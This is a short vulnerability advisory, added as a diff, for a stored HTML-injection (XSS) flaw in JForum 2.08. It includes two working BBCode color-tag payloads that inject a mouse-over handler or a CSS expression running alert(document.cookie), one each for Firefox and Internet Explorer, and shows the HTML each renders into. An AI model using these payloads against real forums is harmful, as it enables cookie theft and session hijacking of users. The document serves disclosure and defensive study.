@@ -1,0 +1,28 @@
+source: http://www.securityfocus.com/bid/42414/info
+
+JForum is prone to an HTML-injection vulnerability because it fails to properly sanitize user-supplied input before using it in dynamically generated content.
+
+Successful exploits will allow attacker-supplied HTML and script code to run in the context of the affected browser, potentially allowing the attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user. Other attacks are also possible.
+
+JForum 2.08 is vulnerable; other versions may also be affected. 
+
+Stored XSS - proof of concept for Firefox ("onMouseOver" is blacklisted):
+
+    [color=red' style='top:0px;left:0px;position:absolute;font-size:500;opacity:0' /onMouseOver='alert(document.cookie)']XSS4FF[/color] 
+
+
+Renders into the following HTML code:
+
+    <font color='red' style='top:0px;left:0px;position:absolute;font-size:500;opacity:0' /onMouseOver='alert(document.cookie)'>XSS4FF</font> 
+
+
+
+Stored XSS - proof of concept for Internet Explorer ("style" cannot contain parenthesis "(" ):
+
+    [color=red' /style='color:expression(alert(document.cookie))']XSS4IE[/color] 
+
+
+
+Renders into the following HTML code:
+
+    <font color='red' /style='color:expression(alert(document.cookie))'>XSS4IE</font> 
